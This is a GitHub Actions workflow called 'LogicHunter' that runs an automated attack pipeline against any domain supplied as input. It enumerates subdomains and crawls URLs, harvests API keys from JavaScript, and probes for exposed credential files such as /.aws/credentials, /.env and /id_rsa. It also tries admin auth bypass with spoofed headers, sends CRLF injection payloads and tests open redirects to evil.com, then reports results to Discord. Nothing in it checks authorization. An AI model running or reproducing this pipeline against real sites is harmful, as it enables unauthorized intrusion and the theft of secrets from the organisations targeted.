name: "LogicHunter - Zero False Positives"

on:
  workflow_dispatch:
    inputs:
      domain:
        description: "Target Domain (e.g., datacamp.com)"
        required: true

jobs:
  hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    permissions:
      contents: write

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"
          cache: false

      - name: Cache Tools
        id: cache
        uses: actions/cache@v4
        with:
          path: |
            ~/go/bin
            ~/.local/nuclei-templates
          key: go-tools-${{ runner.os }}-v3

      - name: Setup Environment
        run: |
          D="${{ github.event.inputs.domain }}"
          echo "DOMAIN=$D" >> $GITHUB_ENV
          mkdir -p /tmp/hunt/$D/{urls,auth,ssrf,takeover,js/content,findings}
          touch /tmp/hunt/$D/auth/bypass_results.txt \
                /tmp/hunt/$D/js/secrets.txt \
                /tmp/hunt/$D/takeover/confirmed.txt \
                /tmp/hunt/$D/ssrf/results.txt \
                /tmp/hunt/$D/findings/info_disclosure.txt
          sudo apt-get update -qq && sudo apt-get install -y -qq jq

      - name: Install Tools
        if: steps.cache.outputs.cache-hit != 'true'
        run: |
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          go install github.com/tomnomnom/gf@latest
          go install github.com/tomnomnom/anew@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          go install github.com/PentestPad/subzy@latest
          go install github.com/tomnomnom/waybackurls@latest
          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gfp 2>/dev/null || true
          mkdir -p ~/.gf && cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
          nuclei -update-templates -ud ~/.local/nuclei-templates -silent

      - name: Update PATH
        run: echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Recon & URL Collection
        continue-on-error: true
        run: |
          D="$DOMAIN"

          subfinder -d $D -all -silent \
            | httpx -silent -threads 50 -timeout 10 -retries 1 \
              -json -o /tmp/hunt/$D/urls/live.json 2>/dev/null || true

          # Extract clean URLs from JSON — not awk on raw text
          jq -r '.url' /tmp/hunt/$D/urls/live.json 2>/dev/null \
            | sort -u > /tmp/hunt/$D/urls/targets.txt || true

          [ ! -s /tmp/hunt/$D/urls/targets.txt ] && \
            echo "https://$D" > /tmp/hunt/$D/urls/targets.txt

          gau --threads 5 $D \
            --blacklist png,jpg,jpeg,gif,svg,woff,css,mp4,ico \
            | anew /tmp/hunt/$D/urls/all.txt 2>/dev/null || true

          if [ -s /tmp/hunt/$D/urls/targets.txt ]; then
            katana \
              -list /tmp/hunt/$D/urls/targets.txt \
              -silent -jc -d 2 -timeout 10 -c 20 \
              -ef css,svg,png,jpg,gif,ico,woff,ttf \
              | anew /tmp/hunt/$D/urls/all.txt 2>/dev/null || true
          fi

          grep -vE "\.(png|jpg|jpeg|gif|svg|woff|css|mp4|webp|ico|ttf|eot)$" \
            /tmp/hunt/$D/urls/all.txt \
            > /tmp/hunt/$D/urls/clean.txt 2>/dev/null || true

          echo "Targets: $(wc -l < /tmp/hunt/$D/urls/targets.txt)"
          echo "URLs:    $(wc -l < /tmp/hunt/$D/urls/clean.txt)"

      - name: JS Secret Scan (Content-Based)
        continue-on-error: true
        run: |
          D="$DOMAIN"

          grep -iE '\.js($|\?)' /tmp/hunt/$D/urls/clean.txt 2>/dev/null \
            | grep -v '\.min\.js' \
            | sort -u | head -150 > /tmp/hunt/$D/js/links.txt

          # Download JS content first, then grep content — not URL stream
          while IFS= read -r JS; do
            [ -z "$JS" ] && continue
            fname=$(echo "$JS" | md5sum | cut -d' ' -f1)
            curl -sk "$JS" --max-time 10 \
              -o "/tmp/hunt/$D/js/content/${fname}.js" 2>/dev/null || true
          done < /tmp/hunt/$D/js/links.txt

          cat /tmp/hunt/$D/js/content/*.js 2>/dev/null \
            | grep -Eoi \
              "(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{59}|AIza[0-9A-Za-z\-_]{35}|sk_live_[0-9a-zA-Z]{24}|SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43})" \
            | sort -u > /tmp/hunt/$D/js/secrets.txt 2>/dev/null || true

          echo "JS Secrets: $(wc -l < /tmp/hunt/$D/js/secrets.txt)"

      - name: Takeover Check (Confirmed Only)
        continue-on-error: true
        run: |
          D="$DOMAIN"
          jq -r '.host' /tmp/hunt/$D/urls/live.json 2>/dev/null \
            | sort -u > /tmp/hunt/$D/subs.txt || true

          subzy run \
            --targets /tmp/hunt/$D/subs.txt \
            --concurrency 20 \
            --hide_fails \
            --verify_ssl \
            --output /tmp/hunt/$D/takeover/subzy_raw.json 2>/dev/null || true

          # Parse JSON: only vulnerable:true
          python3 -c "
import json
results = []
try:
    with open('/tmp/hunt/$D/takeover/subzy_raw.json') as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try:
                obj = json.loads(line)
                if isinstance(obj, dict) and obj.get('vulnerable') is True:
                    results.append(f\"{obj.get('subdomain','')} => {obj.get('service','')}\")
            except: pass
except FileNotFoundError: pass
with open('/tmp/hunt/$D/takeover/confirmed.txt','w') as f:
    f.write('\n'.join(results) + ('\n' if results else ''))
print('Confirmed takeovers:', len(results))
"

      - name: Information Disclosure
        continue-on-error: true
        run: |
          D="$DOMAIN"
          PATHS=(
            "/.env" "/.env.local" "/.env.production" "/.env.staging"
            "/.env.backup" "/.env.bak" "/.env.old"
            "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
            "/config.json" "/config.yaml" "/config.yml" "/config.php"
            "/database.yml" "/database.json" "/settings.py"
            "/phpinfo.php" "/info.php" "/test.php"
            "/server-status" "/server-info"
            "/swagger.json" "/openapi.json" "/swagger.yaml"
            "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
            "/api/swagger.json" "/api-docs"
            "/actuator" "/actuator/env" "/actuator/health"
            "/actuator/mappings" "/actuator/beans" "/actuator/configprops"
            "/.htpasswd" "/.htaccess"
            "/dump.sql" "/backup.zip" "/backup.tar.gz" "/backup.sql"
            "/wp-config.php" "/wp-config.php.bak"
            "/composer.json" "/package.json" "/yarn.lock"
            "/Dockerfile" "/docker-compose.yml"
            "/.aws/credentials" "/credentials.json" "/service-account.json"
            "/.npmrc" "/private.key" "/id_rsa"
            "/CHANGELOG.md" "/README.md" "/.gitignore"
            "/crossdomain.xml" "/clientaccesspolicy.xml"
            "/.travis.yml" "/Jenkinsfile"
          )

          while IFS= read -r host; do
            [ -z "$host" ] && continue
            for path in "${PATHS[@]}"; do
              url="${host}${path}"
              resp=$(curl -sk -o /tmp/disc_body.txt \
                -w "%{http_code}|%{size_download}" \
                --max-time 6 -L "$url" 2>/dev/null || echo "000|0")
              code=$(echo "$resp" | cut -d'|' -f1)
              size=$(echo "$resp" | cut -d'|' -f2)
              if [ "$code" = "200" ] && [ "${size:-0}" -gt 20 ] 2>/dev/null; then
                snippet=$(head -c 200 /tmp/disc_body.txt 2>/dev/null)
                if ! echo "$snippet" | grep -qiE "(<!DOCTYPE|<html|<head)"; then
                  echo "[$code][$size B] $url" \
                    >> /tmp/hunt/$D/findings/info_disclosure.txt
                fi
              fi
            done
          done < /tmp/hunt/$D/urls/targets.txt

          echo "Info disclosure: $(wc -l < /tmp/hunt/$D/findings/info_disclosure.txt)"

      - name: Nuclei Scan
        continue-on-error: true
        timeout-minutes: 30
        run: |
          D="$DOMAIN"
          nuclei \
            -list /tmp/hunt/$D/urls/targets.txt \
            -ud ~/.local/nuclei-templates \
            -tags auth,bypass,jwt,exposure,takeover,disclosure,config,secret \
            -severity critical,high,medium \
            -rl 30 -c 10 \
            -timeout 10 -retries 1 \
            -silent -json \
            -o /tmp/hunt/$D/findings/nuclei.json 2>/dev/null || true

          echo "Nuclei: $(wc -l < /tmp/hunt/$D/findings/nuclei.json)"

      - name: Auth Bypass (With Baseline Comparison)
        continue-on-error: true
        run: |
          D="$DOMAIN"
          HEADERS=(
            "X-Original-URL: /admin"
            "X-Rewrite-URL: /admin"
            "X-Forwarded-For: 127.0.0.1"
            "X-Custom-IP-Authorization: 127.0.0.1"
            "X-Forwarded-Host: localhost"
          )

          head -15 /tmp/hunt/$D/urls/targets.txt | while IFS= read -r HOST; do
            [ -z "$HOST" ] && continue
            # Get baseline — must be 403/401 for bypass to be real
            BASELINE=$(curl -sk -o /dev/null -w "%{http_code}" \
              "$HOST/admin" --max-time 5 2>/dev/null || echo "000")

            for H in "${HEADERS[@]}"; do
              STATUS=$(curl -sk -H "$H" -o /dev/null -w "%{http_code}" \
                "$HOST/admin" --max-time 5 2>/dev/null || echo "000")

              # Bypass = was forbidden, now accessible
              if { [ "$BASELINE" = "403" ] || [ "$BASELINE" = "401" ]; } && \
                 { [ "$STATUS" = "200" ]   || [ "$STATUS" = "302" ]; }; then
                echo "[BYPASS] $HOST/admin | Header: $H | $BASELINE => $STATUS" \
                  >> /tmp/hunt/$D/auth/bypass_results.txt
              fi
            done
          done

      - name: CRLF Injection + Open Redirect
        continue-on-error: true
        run: |
          D="$DOMAIN"
          mkdir -p /tmp/hunt/$D/findings

          # CRLF Injection
          CRLF_PAYLOADS=("%0d%0aX-Injected:crlf" "%0aX-Injected:crlf" "%0d%0aSet-Cookie:crlftest=1")
          head -10 /tmp/hunt/$D/urls/targets.txt | while IFS= read -r host; do
            [ -z "$host" ] && continue
            for payload in "${CRLF_PAYLOADS[@]}"; do
              resp=$(curl -sk -I --max-time 5 "${host}/${payload}" 2>/dev/null || echo "")
              if echo "$resp" | grep -qi "x-injected:crlf\|crlftest=1"; then
                echo "[CRLF] $host | $payload"                   >> /tmp/hunt/$D/findings/crlf.txt
              fi
            done
          done

          # Open Redirect
          grep -iE '[?&](url|redirect|next|return|goto|target|dest|destination|redir|redirect_uri|callback|continue|forward|location|link|out|view|logoutUrl|image_url|go)='             /tmp/hunt/$D/urls/clean.txt 2>/dev/null             | sort -u | head -30 | while IFS= read -r url; do
              test_url=$(echo "$url" | sed 's|=.*&|=https://evil.com\&|g; s|=.*$|=https://evil.com|')
              location=$(curl -sk -o /dev/null -w "%{redirect_url}"                 --max-time 5 "$test_url" 2>/dev/null || echo "")
              if echo "$location" | grep -q "evil.com"; then
                echo "[OPEN-REDIRECT] $url => $location"                   >> /tmp/hunt/$D/findings/open_redirect.txt
              fi
            done

          echo "CRLF: $(wc -l < /tmp/hunt/$D/findings/crlf.txt 2>/dev/null || echo 0)"
          echo "Open Redirect: $(wc -l < /tmp/hunt/$D/findings/open_redirect.txt 2>/dev/null || echo 0)"

      - name: Discord Notification
        if: always()
        run: |
          D="$DOMAIN"
          B=$(wc -l < /tmp/hunt/$D/auth/bypass_results.txt       2>/dev/null || echo 0)
          J=$(wc -l < /tmp/hunt/$D/js/secrets.txt                2>/dev/null || echo 0)
          T=$(wc -l < /tmp/hunt/$D/takeover/confirmed.txt        2>/dev/null || echo 0)
          I=$(wc -l < /tmp/hunt/$D/findings/info_disclosure.txt  2>/dev/null || echo 0)
          N=$(wc -l < /tmp/hunt/$D/findings/nuclei.json          2>/dev/null || echo 0)

          COLOR=5814783
          { [ "$B" -gt 0 ] || [ "$J" -gt 0 ] || [ "$T" -gt 0 ] || [ "$I" -gt 0 ]; } && \
            COLOR=15158332

          jq -n \
            --arg d  "$D" \
            --arg b  "$B" \
            --arg j  "$J" \
            --arg t  "$T" \
            --arg i  "$I" \
            --arg n  "$N" \
            --argjson color "$COLOR" \
          '{
            username: "LogicHunter",
            embeds:[{
              title: ("Scan Complete: " + $d),
              color: $color,
              fields: [
                {name:"Auth Bypass",      value:$b, inline:true},
                {name:"JS Secrets",       value:$j, inline:true},
                {name:"Takeovers",        value:$t, inline:true},
                {name:"Info Disclosure",  value:$i, inline:true},
                {name:"Nuclei Findings",  value:$n, inline:true}
              ]
            }]
          }' | curl -s -X POST "${{ secrets.DISCORD_WEBHOOK }}" \
                 -H "Content-Type: application/json" -d @- || true

      - name: Upload Results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: logichunter-${{ env.DOMAIN }}-${{ github.run_number }}
          path: /tmp/hunt/${{ env.DOMAIN }}/
          retention-days: 30
